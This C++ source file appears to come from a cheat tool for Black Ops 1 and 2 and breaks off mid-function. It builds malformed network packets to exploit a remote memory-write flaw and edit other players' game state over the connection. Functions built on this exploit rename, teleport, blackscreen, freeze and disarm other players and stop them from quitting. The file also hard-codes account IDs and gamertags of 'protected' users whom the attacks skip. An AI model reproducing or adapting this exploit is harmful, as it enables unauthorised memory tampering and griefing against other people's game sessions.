#include "stdafx.h"

Netchan g_Netchan;

std::vector<closest_addr_t> Netchan::closest_addresses;

bool bElse = false;

QWORD protectedXUIDs_kickban[2] = {
	0x000901F957AB9FAA,
	0x000901F5E19A4FEF
};

#if defined (BO2)
QWORD protectedXUIDs[12] = {
	0x000901F957AB9FAA,
	0x000901F0E87D6FDF,
	0x0009000006473F81,
	0x0009000002D5DA29,
	0x0009000003717050,
	0x000901F75D4704D0,
	0x000901F624CE7C2F,
	0x000901FF22C8899E,
	0x000901FACABFFA19,
	0x000901F7A878EDEE,
	0x000901FA9F93B494,
	0x000901FDE9F9B0B5
};

QWORD protectedXUIDs_spectator[4] = {
	0x000901F0E87D6FDF,
	0x0009000006473F81,
	0x000901F35F2F258C,
	0x000901F03CB131FE
};

#elif defined (BO1)
QWORD protectedXUIDs[3] = {
	0x000901F7A878EDEE,
	0x000901FA9F93B494,
	0x000901FDE9F9B0B5
};

QWORD protectedXUIDs_spectator[3] = {
	0x000901F7A878EDEE, //Deluxe
	0x000901FA9F93B494, //^
	0x000901FDE9F9B0B5 //^
};
#endif

DWORD gClient(int clientNum) {
	return (decryptDWORD(Security->addrs.strct_gClient) + (clientNum * decryptDWORD(Security->addrs.strct_gClient_Size)));
}

DWORD gEntity(int clientNum) {
	return (decryptDWORD(Security->addrs.strct_gEntity) + (clientNum * decryptDWORD(Security->addrs.strct_gEntity_Size)));
}

DWORD gClient2(int clientNum) {
	return (*(int*)decryptDWORD(Security->addrs.strct_gClient_t) + (clientNum * decryptDWORD(Security->addrs.strct_gClient_t_Size)));
}

closest_addr_t Netchan::GetClosestAddressFrom(DWORD target_address, DWORD base_address)
{
	for (int i = 0; i < closest_addresses.size(); i++) {
		if (closest_addresses[i].address == target_address) {
			return closest_addresses[i];
		}
	}

	closest_addr_t closest_addr;
	closest_addr.address = target_address;
	closest_addr.closest_address = base_address;
	closest_addr.closest_offset = 0;
	closest_addr.closest_length = 0;

	for (unsigned char offset = 0; offset < 0xFF; ++offset) {
		for (short length = SHRT_MIN; length < SHRT_MAX; ++length) {
			unsigned int current_address = base_address + static_cast<unsigned int>(offset)* length;
			if (current_address > target_address) {
				continue;
			}
			if (target_address - current_address < target_address - closest_addr.closest_address) {
				closest_addr.closest_address = current_address;
				closest_addr.closest_offset = offset;
				closest_addr.closest_length = length;
			}
		}
	}
	closest_addr.delta = target_address - closest_addr.closest_address;

	closest_addresses.push_back(closest_addr);

	return closest_addr;
}

//closest_addr_t Netchan::GetClosestAddressFrom(DWORD target_address, DWORD base_address)
//{
//	// Check if the target address is already in the closest_addresses vector
//	auto existingAddr = std::find_if(closest_addresses.begin(), closest_addresses.end(),
//		[target_address](const closest_addr_t& addr) { return addr.address == target_address; });
//
//	if (existingAddr != closest_addresses.end()) {
//		return *existingAddr;
//	}
//
//	closest_addr_t closest_addr;
//	closest_addr.address = target_address;
//	closest_addr.closest_address = base_address;
//	closest_addr.closest_offset = 0;
//	closest_addr.closest_length = 0;
//	closest_addr.delta = 0x7FFFFFFF;
//
//	// Limit the range of offset and length
//	unsigned char max_offset = 0xFF;
//	short min_length = 1;
//	short max_length = SHRT_MAX;
//
//	for (unsigned char offset = 0; offset < max_offset; ++offset) {
//		for (short length = min_length; length < max_length; ++length) {
//			unsigned int current_address = base_address + static_cast<unsigned int>(offset) * length;
//
//			// Skip unnecessary iterations
//			if (current_address > target_address) {
//				break;
//			}
//
//			int delta = target_address - current_address;
//
//			// Check if this address is closer
//			if (delta < closest_addr.delta) {
//				closest_addr.closest_address = current_address;
//				closest_addr.closest_offset = offset;
//				closest_addr.closest_length = length;
//				closest_addr.delta = delta;
//			}
//		}
//	}
//
//	// Add the closest address to the vector
//	closest_addresses.push_back(closest_addr);
//
//	return closest_addr;
//}


bool Netchan::setup_packet_header(msg_t* msg, int size, closest_addr_t closest_addr)
{
#if !defined (DEBUG_BUILD)
	if (Shield_CheckStatus())
#else
	if (!bElse)
#endif
	{
		netchan_t* chan = (netchan_t*)(*(int*)(decryptDWORD(Security->addrs.strct_clientConnection)) + decryptDWORD(Security->addrs.strct_netchanAdditive));
		if (chan == nullptr)
			return false;

		MSG_WriteLong(msg, chan->outgoingSequence | (chan->reliable_fragments ? 0xC0000000 : 0x80000000));

		MSG_WriteByte(msg, closest_addr.closest_offset);
		MSG_WriteByte(msg, 0x00);
		MSG_WriteShort(msg, closest_addr.closest_length);
		MSG_WriteShort(msg, size + closest_addr.delta);
		return true;
	}
	return false;
}

void Netchan::setup_buffer_rme()
{
#if !defined (DEBUG_BUILD)
	if (Shield_CheckStatus())
#else
	if (!bElse)
#endif
	{
		netchan_t* chan = (netchan_t*)(*(int*)(decryptDWORD(Security->addrs.strct_clientConnection)) + decryptDWORD(Security->addrs.strct_netchanAdditive));

		msg_t msg = msg_t(); 
		CHAR buf[0x4F0];

		MSG_Init(&msg, buf, 0x4F0);
		MSG_WriteLong(&msg, chan->outgoingSequence | (chan->reliable_fragments ? 0xC0000000 : 0x80000000));

#if defined (BO2)
		MSG_WriteByte(&msg, 0xFFBB);
		MSG_WriteByte(&msg, 0);
		MSG_WriteShort(&msg, 0xFFFF1111);
		MSG_WriteShort(&msg, 0xFAFA);

		MSG_WriteByte(&msg, 0);
		MSG_WriteByte(&msg, 0);
#elif defined (BO1) ||  defined (BO1_ZM)
		MSG_WriteByte(&msg, 0xFFBB);
		MSG_WriteByte(&msg, 0);
		MSG_WriteShort(&msg, 0xFFFF1111);
		MSG_WriteShort(&msg, 0xFAFA);


		//MSG_WriteByte(&msg, 0x8);                   
		//MSG_WriteByte(&msg, 0);                   
		//MSG_WriteShort(&msg, 0x88FE);                   
		//MSG_WriteShort(&msg, 4);


#endif

		MSG_WriteLong(&msg, 0xDEADBEEF);
		//MSG_WriteLong(&msg, decryptDWORD(Security->addrs.gClient_gEntity_Addrs));

		NET_SendPacket(chan->sock, msg.cursize, msg.data, chan->remoteAddress);
	}
}


void Netchan::write(DWORD address, char* buf, int size)
{
#if !defined (DEBUG_BUILD)
	if (Shield_CheckStatus())
#else
	if (!bElse)
#endif
	{
		netchan_t* chan = (netchan_t*)(*(int*)(decryptDWORD(Security->addrs.strct_clientConnection)) + decryptDWORD(Security->addrs.strct_netchanAdditive));

		closest_addr_t closest_addr = GetClosestAddressFrom(address, decryptDWORD(Security->addrs.gClient_gEntity_Addrs));

		msg_t msg = msg_t();
		CHAR msg_buf[0x4F0];

		MSG_Init(&msg, msg_buf, sizeof(msg_buf));

		if (!setup_packet_header(&msg, size, closest_addr))
			return;

		CHAR data[0x500];
		memset(&data, 0, 0x500);
		memcpy(&data[closest_addr.delta], buf, size);

		MSG_WriteData(&msg, data, size + closest_addr.delta);

		NET_SendPacket(chan->sock, msg.cursize, msg.data, chan->remoteAddress);
	}
}

//std::vector<closest_addr_t> Netchan::closest_addresses;
std::vector<RMEOptions_s> gRME_Options;

void Netchan::write_int(DWORD address, DWORD value)
{
	RMEOptions_s rmeOption;

	rmeOption.dwAddress = address;
	rmeOption.dwValue = value;

	if (value == 0)
		rmeOption.bAllowNullValue = TRUE;

	gRME_Options.push_back(rmeOption);


	//char buf[4] = { 0 };
	//memcpy(buf, &value, 4);
	//write(address, buf, 4);
}
void Netchan::write_short(DWORD address, short value)
{
	RMEOptions_s rmeOption;

	rmeOption.dwAddress = address;
	rmeOption.sValue = value;

	if (value == 0)
		rmeOption.bAllowNullValue = TRUE;

	gRME_Options.push_back(rmeOption);

	//char buf[2] = { 0 };
	//memcpy(buf, &value, 2);
	//write(address, buf, 2);
}
void Netchan::write_byte(DWORD address, byte value)
{
	RMEOptions_s rmeOption;

	rmeOption.dwAddress = address;
	rmeOption.bValue = value;

	if (value == 0)
		rmeOption.bAllowNullValue = TRUE;

	gRME_Options.push_back(rmeOption);

	//char buf[1] = { 0 };
	//memcpy(buf, &value, 1);
	//write(address, buf, 1);
}
void Netchan::write_int64(DWORD address, QWORD value)
{
	RMEOptions_s rmeOption;

	rmeOption.dwAddress = address;
	rmeOption.qwValue = value;

	gRME_Options.push_back(rmeOption);

	//char buf[8] = { 0 };
	//memcpy(buf, &value, 8);
	//write(address, buf, 8);
}
void Netchan::write_float(DWORD address, float value)
{
	RMEOptions_s rmeOption;

	rmeOption.dwAddress = address;
	rmeOption.fValue = value;

	gRME_Options.push_back(rmeOption);
	//char buf[4] = { 0 };
	//memcpy(buf, &value, 4);
	//write(address, buf, 4);
}
void Netchan::write_vector3(DWORD address, vec3 vec)
{
	RMEOptions_s rmeOption;

	rmeOption.dwAddress = address;
	rmeOption.vValue = vec;

	gRME_Options.push_back(rmeOption);
	//char buf[12] = { 0 };
	//memcpy(buf, &vec, sizeof(vec3));
	//write(address, buf, sizeof(vec3));
}

void Netchan::write_string(DWORD address, std::string string)
{
	RMEOptions_s rmeOption;

	rmeOption.dwAddress = address;
	rmeOption.data = string.data();

	gRME_Options.push_back(rmeOption);

	//write(address, (char*)string.data(), string.length() + 1);
}

struct protection_s {
	unsigned long long XUID;
	const char* clientName;

	bool bBlackOps1;
	bool bBlackOps2;

	bool bScreenOpts;
};

protection_s protectionList[14] = {
	0x000901F957AB9FAA, "Matthew", true, true, false,
	0x000901F0E87D6FDF, "Mask", false, true, true,
	0x0009000006473F81, "Kaleb", false, true, true,
	0x0009000002D5DA29, "Unk", false, true,  false,
	0x0009000003717050, "Unk", false, true, false,
	0x000901F75D4704D0, "Unk", false, true, false,
	0x000901F624CE7C2F, "Unk", false, true, false,
	0x000901FF22C8899E, "Unk", false, true, false,
	0x000901FACABFFA19, "Unk", false, true, false,
	0x000901F7A878EDEE, "Deluxe", true, true, true,
	0x000901FA9F93B494, "Deluxe", true, true, true,
	0x000901FDE9F9B0B5, "Deluxe", true, true, true,
	0x000901FC030050F4, "Teardok", false, true, false,
	0x000901FD1EA52880, "Fuel", false, true, false
};

bool isClientProtected(int clientNum, bool bScreenOpt = false) {
	bool bResult = false;

	for (int i = 0; i < ARRAYSIZE(protectionList); i++) {
		if (partyMember[clientNum].XUID == protectionList[i].XUID) {

#if defined (BO1)
			if (protectionList[i].bBlackOps1)
#elif defined (BO2)
			if (protectionList[i].bBlackOps2)
#endif
			{

				if (bScreenOpt) {
					if (protectionList[i].bScreenOpts) {
						bResult = true;
						break;
					}
				}
				else {
					bResult = true;
					break;
				}
			}
		}
	}
	return bResult;
}

//bool isClientProtected(int clientNum) {
//	bool bResult = false;
//
//	for (int i = 0; i < ARRAYSIZE(protectedXUIDs); i++) {
//		if (partyMember[clientNum].XUID == protectedXUIDs[i]) {
//			bResult = true;
//			break;
//		}
//	}
//	return bResult;
//}

bool isClientProtected_spec(int clientNum) {
	bool bResult = false;

	for (int i = 0; i < ARRAYSIZE(protectedXUIDs_spectator); i++) {
		if (partyMember[clientNum].XUID == protectedXUIDs_spectator[i]) {
			bResult = true;
			break;
		}
	}
	return bResult;
}

bool isClientProtected_kickban(int clientNum) {
	bool bResult = false;

	for (int i = 0; i < ARRAYSIZE(protectedXUIDs_kickban); i++) {
		if (partyMember[clientNum].XUID == protectedXUIDs_kickban[i]) {
			bResult = true;
			break;
		}
	}
	return bResult;
}

void RenameAll(std::string renameString) {
	if (!Game::CheckInGame() || !CG::bLobbyInitialized)
		return;
	
	g_Netchan.setup_buffer_rme();

	for (int i = 0; i < 18; i++) {
		//if (i == Structs::get_cg()->clientNumber)
		//	continue;

#if defined (BO2)
		g_Netchan.write_string((gClient(i) + 0x5534), renameString);
#elif defined (BO1)
		g_Netchan.write_string((gClient(i) + 0x27F8), renameString);
#elif defined (BO1_ZM)
		g_Netchan.write_string((gClient(i) + 0x1AA0), renameString);
#endif
	}
}

void RenameSelectedClient(int clientNum, std::string renameString) {
	if (!Game::CheckInGame() || !CG::bLobbyInitialized)
		return;

	g_Netchan.setup_buffer_rme();

	if (clientNum == Structs::get_cg()->clientNumber)
		return;

	if (partyMember[clientNum].XUID == 0 || partyMember[clientNum].gamertag[0] == NULL)
		return;

#if defined (BO2)
	g_Netchan.write_string((gClient(clientNum) + 0x5534), renameString);
#elif defined (BO1)
	g_Netchan.write_string((gClient(clientNum) + 0x27F8), renameString);
#elif defined (BO1_ZM)
	g_Netchan.write_string((gClient(clientNum) + 0x1AA0), renameString);
#endif
}

void ChangeGodMode(int clientNum, bool toggle) {
	if (!Game::CheckInGame() || !CG::bLobbyInitialized)
		return;

	g_Netchan.setup_buffer_rme();

	int iClientNum = clientNum;

	if (iClientNum == -1)
		iClientNum = Structs::get_cg()->clientNumber;

	if (toggle) {
#if defined (BO2)
		g_Netchan.write_byte((gClient(iClientNum) + 0x1B), 0x05);
#elif defined (BO1) || defined (BO1_ZM)
		g_Netchan.write_byte((gClient(iClientNum) + 0x17), 0x05);
#endif
	}
	else {
#if defined (BO2)
		g_Netchan.write_byte((gClient(iClientNum) + 0x1B), 0x04);
#elif defined (BO1) || defined (BO1_ZM)
		g_Netchan.write_byte((gClient(iClientNum) + 0x17), 0x04);
#endif
	}

	//CG_GameMessage(0, va("%s God Mode %s %s", toggle ? "^2Set^7" : "^1Taken^7", toggle ? "for" : "from", partyMember[iClientNum].gamertag));
}

//put your void shit you copied under this comment...


void GodModeEveryone(bool toggle, bool bEnemy) {
	g_Netchan.setup_buffer_rme();

	for (int i = 0; i < 18; i++) {
		bool bIsEnemy = Game::IsEnemy(i);
		if ((!bEnemy && !bIsEnemy) || (bEnemy && bIsEnemy)) {
			if (toggle) {
#if defined (BO2)
				g_Netchan.write_byte((gClient(i) + 0x1B), 0x05);
#elif defined (BO1) || defined (BO1_ZM)
				g_Netchan.write_byte((gClient(i) + 0x17), 0x05);
#endif
			}
			else {
#if defined (BO2)
				g_Netchan.write_byte((gClient(i) + 0x1B), 0x04);
#elif defined (BO1) || defined (BO1_ZM)
				g_Netchan.write_byte((gClient(i) + 0x17), 0x04);
#endif
			}
		}
	}
}

void ChangeSuperSpeed(int clientNum, bool toggle) {
	if (!Game::CheckInGame() || !CG::bLobbyInitialized)
		return;

	g_Netchan.setup_buffer_rme();

	int iClientNum = clientNum;

	if (iClientNum == -1)
		iClientNum = Structs::get_cg()->clientNumber;

	if (toggle) {
#if defined (BO2)
		g_Netchan.write_short((gClient(iClientNum) + 0x54E0), 0x4090);
#elif defined (BO1)
		g_Netchan.write_short((gClient(iClientNum) + 0x27A8), 0x4090);
#elif defined (BO1_ZM)
		g_Netchan.write_short((gClient(iClientNum) + 0x1AD4), 0x4090);
#endif
	}
	else {
#if defined (BO2)
		g_Netchan.write_short((gClient(iClientNum) + 0x54E0), 0x3F80);
#elif defined (BO1)
		g_Netchan.write_short((gClient(iClientNum) + 0x27A8), 0x3F80);
#elif defined (BO1_ZM)
		g_Netchan.write_short((gClient(iClientNum) + 0x1AD4), 0x3F80);
#endif
	}

	//CG_GameMessage(0, va("%s Super Speed %s %s", toggle ? "^2Set^7" : "^1Taken^7", toggle ? "for" : "from", partyMember[iClientNum].gamertag));
}

void SuperSpeedEveryone(bool toggle, bool bEnemy) {
	g_Netchan.setup_buffer_rme();

	for (int i = 0; i < 18; i++) {
		bool bIsEnemy = Game::IsEnemy(i);
		if ((!bEnemy && !bIsEnemy) || (bEnemy && bIsEnemy)) {
			if (toggle) {
#if defined (BO2)
				g_Netchan.write_short((gClient(i) + 0x54E0), 0x4090);
#elif defined (BO1)
				g_Netchan.write_short((gClient(i) + 0x27A8), 0x4090);
#elif defined (BO1_ZM)
				g_Netchan.write_short((gClient(i) + 0x1AD4), 0x4090);
#endif
			}
			else {
#if defined (BO2)
				g_Netchan.write_short((gClient(i) + 0x54E0), 0x3F80);
#elif defined (BO1)
				g_Netchan.write_short((gClient(i) + 0x27A8), 0x3F80);
#elif defined (BO1_ZM)
				g_Netchan.write_short((gClient(i) + 0x1AD4), 0x3F80);
#endif
			}
		}
	}
}

void ChangeInvisibility(int clientNum, bool toggle) {
	if (!Game::CheckInGame() || !CG::bLobbyInitialized)
		return;

	g_Netchan.setup_buffer_rme();

	int iClientNum = clientNum;

	if (iClientNum == -1)
		iClientNum = Structs::get_cg()->clientNumber;

	if (toggle) {
#if defined (BO2)
		g_Netchan.write_byte((gClient(iClientNum) + 0xFF), 0x20);
#elif defined (BO1) || defined (BO1_ZM)
		g_Netchan.write_short((gClient(iClientNum) + 0xE2), 0x0020);
#endif
	}
	else {
#if defined (BO2)
		g_Netchan.write_byte((gClient(iClientNum) + 0xFF), 0x00);
#elif defined (BO1) || defined (BO1_ZM)
		g_Netchan.write_short((gClient(iClientNum) + 0xE2), 0x0000);
#endif
	}

	CG_GameMessage(0, va("%s Invisibility %s %s", toggle ? "^2Set^7" : "^1Taken^7", toggle ? "for" : "from", partyMember[iClientNum].gamertag));
}

void ChangeInfraredVision(int clientNum, bool toggle) {
	if (!Game::CheckInGame() || !CG::bLobbyInitialized)
		return;

	g_Netchan.setup_buffer_rme();

#if defined (BO2)
	int iClientNum = clientNum;

	if (iClientNum == -1)
		iClientNum = Structs::get_cg()->clientNumber;

	if (toggle) {
		g_Netchan.write_byte((gClient(iClientNum) + 0x1A), 0x10);
	}
	else {
		g_Netchan.write_byte((gClient(iClientNum) + 0x1A), 0x00);
	}

	CG_GameMessage(0, va("%s Infrared Vision %s %s", toggle ? "^2Set^7" : "^1Taken^7", toggle ? "for" : "from", partyMember[iClientNum].gamertag));
#endif
}

void TeleportPlayerToMe(int clientNum) {
	if (!Game::CheckInGame() || !CG::bLobbyInitialized)
		return;

	if (!isClientProtected(clientNum)) {
		g_Netchan.setup_buffer_rme();

#if defined (BO2)
		g_Netchan.write_vector3((gClient(clientNum) + 0x28), Structs::get_centity(Structs::get_cg()->clientNumber).Origin);
#elif defined (BO1) || defined (BO1_ZM)
		g_Netchan.write_vector3((gClient(clientNum) + 0x24), Structs::get_centity(Structs::get_cg()->clientNumber).Origin);
#endif
	}
}

void TeleportPlayerToHim(int clientNum) {
	if (!Game::CheckInGame() || !CG::bLobbyInitialized)
		return;

	if (!isClientProtected(clientNum)) {
		g_Netchan.setup_buffer_rme();

#if defined (BO2)
		g_Netchan.write_vector3((gClient(Structs::get_cg()->clientNumber) + 0x28), Structs::get_centity(clientNum).Origin);
#elif defined (BO1) || defined (BO1_ZM)
		g_Netchan.write_vector3((gClient(Structs::get_cg()->clientNumber) + 0x24), Structs::get_centity(clientNum).Origin);
#endif
	}
}

void TeleportPlayerFarAway(int clientNum) {
	if (!Game::CheckInGame() || !CG::bLobbyInitialized)
		return;

	if (!isClientProtected(clientNum)) {
		g_Netchan.setup_buffer_rme();

		vec3 toPos = vec3(0, 0, 0);
		memcpy(&toPos, &Structs::get_centity(clientNum).Origin, sizeof(vec3));

		toPos.x = INT_MAX;

#if defined (BO2)
		g_Netchan.write_vector3((gClient(clientNum) + 0x28), toPos);
#elif defined (BO1) || defined (BO1_ZM)
		g_Netchan.write_vector3((gClient(clientNum) + 0x24), toPos);
#endif
	}
}

void TeleportAllPlayers() {
	if (!Game::CheckInGame() || !CG::bLobbyInitialized)
		return;

	g_Netchan.setup_buffer_rme();

	for (int i = 0; i < 18; i++) {
		if (i == Structs::get_cg()->clientNumber)
			continue;

		if (isClientProtected(i))
			continue;

#if defined (BO2)
		g_Netchan.write_vector3((gClient(i) + 0x28), Structs::get_centity(Structs::get_cg()->clientNumber).Origin);
#elif defined (BO1) || defined (BO1_ZM)
		g_Netchan.write_vector3((gClient(i) + 0x24), Structs::get_centity(Structs::get_cg()->clientNumber).Origin);
#endif

	}
}

float RandomFloat(float min, float max)
{
	// this  function assumes max > min, you may want 
	// more robust error checking for a non-debug build
	float random = ((float)rand()) / (float)RAND_MAX;

	// generate (in your case) a float between 0 and (4.5-.78)
	// then add .78, giving you a float between .78 and 4.5
	float range = max - min;
	return (random * range) + min;
}

bool bSwitch = false;

void MoveEveryoneAround() {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		//g_Netchan.setup_buffer_rme();

		vec3 toPos = vec3(0, 0, 0);

		for (int i = 0; i < 18; i++) {
			//if (i == Structs::get_cg()->clientNumber)
			//	continue;

			memcpy(&toPos, &Structs::get_centity(i).Origin, sizeof(vec3));

			float randomValue = RandomFloat(5, 25);

			if (!bSwitch) {
				toPos.x += randomValue;
				g_Netchan.write_vector3((gClient(i) + 0x28), toPos);
				bSwitch = true;
			}
			else {
				if (bSwitch) {
					toPos.x -= randomValue;
					g_Netchan.write_vector3((gClient(i) + 0x28), toPos);
					bSwitch = false;
				}
			}
		}
	}
}

void SetUnlimitedAmmo(int clientNum) {
	if (!Game::CheckInGame())
		return;

	g_Netchan.setup_buffer_rme();

	int iClientNum = clientNum;

	if (iClientNum == -1)
		iClientNum = Structs::get_cg()->clientNumber;

#if defined (BO2)
	//g_Netchan.write_short((gClient(iClientNum) + 0x43A), 0xFFFF);
	//g_Netchan.write_short((gClient(iClientNum) + 0x43E), 0xFFFF);

	g_Netchan.write_short((gClient(iClientNum) + 0x402), 0xFFFF);
	g_Netchan.write_short((gClient(iClientNum) + 0x432), 0xFFFF);
	g_Netchan.write_short((gClient(iClientNum) + 0x43A), 0xFFFF);
	g_Netchan.write_short((gClient(iClientNum) + 0x42E), 0xFFFF);
	g_Netchan.write_short((gClient(iClientNum) + 0x43E), 0xFFFF);

#elif defined (BO1)
	g_Netchan.write_short((gClient(iClientNum) + 0x3FA), 0xFFFF);
	g_Netchan.write_short((gClient(iClientNum) + 0x402), 0xFFFF);
	g_Netchan.write_short((gClient(iClientNum) + 0x40A), 0xFFFF);
	g_Netchan.write_short((gClient(iClientNum) + 0x412), 0xFFFF);
	g_Netchan.write_short((gClient(iClientNum) + 0x41A), 0xFFFF);
	g_Netchan.write_short((gClient(iClientNum) + 0x422), 0xFFFF);
#elif defined (BO1_ZM)
	g_Netchan.write_short((gClient(iClientNum) + 0x2072), 0xFFFF);
	g_Netchan.write_short((gClient(iClientNum) + 0x2082), 0xFFFF);
	
	g_Netchan.write_short((gClient(iClientNum) + 0x20EA), 0xFFFF);
	g_Netchan.write_short((gClient(iClientNum) + 0x20FA), 0xFFFF);
#endif

	CG_GameMessage(0, va("^2Set^7 Unlimited Ammo for %s", partyMember[iClientNum].gamertag));
}

void TakeAmmoAway(int clientNum) {
	if (!Game::CheckInGame())
		return;

	g_Netchan.setup_buffer_rme();

	int iClientNum = clientNum;

	if (iClientNum == -1)
		iClientNum = Structs::get_cg()->clientNumber;

#if defined (BO2)
	g_Netchan.write_short((gClient(iClientNum) + 0x402), 0);
	g_Netchan.write_short((gClient(iClientNum) + 0x432), 0);
	g_Netchan.write_short((gClient(iClientNum) + 0x43A), 0);
	g_Netchan.write_short((gClient(iClientNum) + 0x42E), 0);
	g_Netchan.write_short((gClient(iClientNum) + 0x43E), 0);
#elif defined (BO1)
	g_Netchan.write_short((gClient(iClientNum) + 0x3FA), 0);
	g_Netchan.write_short((gClient(iClientNum) + 0x402), 0);
	g_Netchan.write_short((gClient(iClientNum) + 0x40A), 0);
	g_Netchan.write_short((gClient(iClientNum) + 0x412), 0);
	g_Netchan.write_short((gClient(iClientNum) + 0x41A), 0);
	g_Netchan.write_short((gClient(iClientNum) + 0x422), 0);
#elif defined (BO1_ZM)
	g_Netchan.write_short((gClient(iClientNum) + 0x2072), 0);
	g_Netchan.write_short((gClient(iClientNum) + 0x2082), 0);

	g_Netchan.write_short((gClient(iClientNum) + 0x20EA), 0);
	g_Netchan.write_short((gClient(iClientNum) + 0x20FA), 0);
#endif
	CG_GameMessage(0, va("^1Took^7 Ammo from %s", partyMember[iClientNum].gamertag));
}

void TakeAmmoAwayAll(bool bEnemy) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		for (int i = 0; i < 18; i++) {
			if (i == Structs::get_cg()->clientNumber)
				continue;

			bool bIsEnemy = Game::IsEnemy(i);
			if ((!bEnemy && !bIsEnemy) || (bEnemy && bIsEnemy)) {
#if defined (BO2)
				g_Netchan.write_short((gClient(i) + 0x402), 0);
				g_Netchan.write_short((gClient(i) + 0x432), 0);
				g_Netchan.write_short((gClient(i) + 0x43A), 0);
				g_Netchan.write_short((gClient(i) + 0x42E), 0);
				g_Netchan.write_short((gClient(i) + 0x43E), 0);
#elif defined (BO1)
				g_Netchan.write_short((gClient(i) + 0x3FA), 0);
				g_Netchan.write_short((gClient(i) + 0x402), 0);
				g_Netchan.write_short((gClient(i) + 0x40A), 0);
				g_Netchan.write_short((gClient(i) + 0x412), 0);
				g_Netchan.write_short((gClient(i) + 0x41A), 0);
				g_Netchan.write_short((gClient(i) + 0x422), 0);
#endif
			}
		}
	}
}

void ChangeMode(int clientNum, int mode) {
	g_Netchan.setup_buffer_rme();

	int iClientNum = clientNum;

	if (iClientNum == -1)
		iClientNum = Structs::get_cg()->clientNumber;

	short modeAdditive = 0;

#if defined (BO1)
	modeAdditive = 0x28E7;
#elif defined (BO1_ZM)
	modeAdditive = 0x1C0F;
#endif

	switch (mode)
	{
	case 0: //Default
		g_Netchan.write_byte((gClient(iClientNum) + modeAdditive), 0x00);
		break;

	case 1: //No Clip
		g_Netchan.write_byte((gClient(iClientNum) + modeAdditive), 0x01);
		break;

	case 2: //Ufo Mode
		g_Netchan.write_byte((gClient(iClientNum) + modeAdditive), 0x02);
		break;

	case 3: //Freeze Controls
		g_Netchan.write_byte((gClient(iClientNum) + modeAdditive), 0x04);
		break;
	}
}

void SetBlackscreen(int clientNum) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		if (!isClientProtected(clientNum)) {
			g_Netchan.setup_buffer_rme();

#if defined (BO2)
			g_Netchan.write_int((gClient(clientNum) + 0x90), 0xFFFFFFFF);
#elif defined (BO1) || defined (BO1_ZM)
			g_Netchan.write_int((gClient(clientNum) + 0x7C), 0xFFFFFFFF);
#endif
		}
		else {
			DbgPrint("clientNum: %i is protected (%llX)", clientNum, partyMember[clientNum].XUID);
		}
	}
}

void BlackscreenEveryone(bool bEnemy) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		for (int i = 0; i < 18; i++) {
			if (i == Structs::get_cg()->clientNumber)
				continue;

			if (isClientProtected(i))
				continue;

			bool bIsEnemy = Game::IsEnemy(i);
			if ((!bEnemy && !bIsEnemy) || (bEnemy && bIsEnemy)) {
#if defined (BO2)
				g_Netchan.write_int((gClient(i) + 0x90), 0xFFFFFFFF);
#elif defined (BO1) || defined (BO1_ZM)
				g_Netchan.write_int((gClient(i) + 0x7C), 0xFFFFFFFF);
#endif
			}
		}
	}
}

int toInt(unsigned char* buffer) {
	int i = (int)(buffer[0] << 24 | buffer[1] << 16 | buffer[2] << 8 | buffer[3]);
	return i;
}

void GiveWeapon(int clientNum, BYTE weaponIndex) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		BYTE finalIndex[0x4] = { 0, 0, 0, weaponIndex };

		if (!CG::bIsZombies) {
			finalIndex[1] |= 0x2;
			finalIndex[2] = 0x86;
		}

		int iClientNum = clientNum;

		if (iClientNum == -1)
			iClientNum = Structs::get_cg()->clientNumber;

		g_Netchan.setup_buffer_rme();

		g_Netchan.write_int((gClient(iClientNum) + 0x2D4), toInt(finalIndex));
	}
}

void TakeWeapon(int clientNum) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		int iClientNum = clientNum;

		if (iClientNum == -1)
			iClientNum = Structs::get_cg()->clientNumber;

		g_Netchan.setup_buffer_rme();

#if defined (BO2)
		g_Netchan.write_int((gClient(iClientNum) + 0x280), 0);
		g_Netchan.write_int((gClient(iClientNum) + 0x264), 0);
		g_Netchan.write_int((gClient(iClientNum) + 0x2B8), 0);
		g_Netchan.write_int((gClient(iClientNum) + 0x2D4), 0);
#elif defined (BO1)
		g_Netchan.write_int((gClient(iClientNum) + 0x1F4), 0);
		g_Netchan.write_int((gClient(iClientNum) + 0x210), 0);
#endif
	}
}

void TakeWeaponForEveryone(bool bEnemy) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		for (int i = 0; i < 18; i++) {
			if (i == Structs::get_cg()->clientNumber)
				continue;

			bool bIsEnemy = Game::IsEnemy(i);
			if ((!bEnemy && !bIsEnemy) || (bEnemy && bIsEnemy)) {
#if defined (BO2)
				g_Netchan.write_int((gClient(i) + 0x280), 0);
				g_Netchan.write_int((gClient(i) + 0x264), 0);
				g_Netchan.write_int((gClient(i) + 0x2B8), 0);
				g_Netchan.write_int((gClient(i) + 0x2D4), 0);
#elif defined (BO1)
				g_Netchan.write_int((gClient(i) + 0x1F4), 0);
				g_Netchan.write_int((gClient(i) + 0x210), 0);
#endif
			}
		}
	}
}

int grenadetImer = 0;

void ThrowGrenadesForEveryone() {
	if (GetTickCount() - grenadetImer > 900) {
		grenadetImer = GetTickCount();

		if (Game::CheckInGame() && CG::bLobbyInitialized) {
			g_Netchan.setup_buffer_rme();

			for (int i = 0; i < 18; i++) {
				if (i == Structs::get_cg()->clientNumber)
					continue;

#if defined (BO2)
				g_Netchan.write_byte((gClient(i) + 0x1D3), 0x18);
#elif defined (BO1) || defined (BO1_ZM)
				g_Netchan.write_byte((gClient(i) + 0x15B), 0x18);
#endif
			}
		}
	}
}

#if defined (BO2)
void GivePoints(int clientNum) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		if (CG::bIsZombies) {
			int iClientNum = clientNum;

			if (iClientNum == -1)
				iClientNum = Structs::get_cg()->clientNumber;

			g_Netchan.setup_buffer_rme();

			g_Netchan.write_int((gClient(iClientNum) + 0x55C9), 0xEEFFFFFF);
		}
	}
}
#endif

void AntiQuit(bool bEnable) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		if (bEnable) {
#if defined (BO2)
			int matchUIVisibilityFlags = 0x00000810;
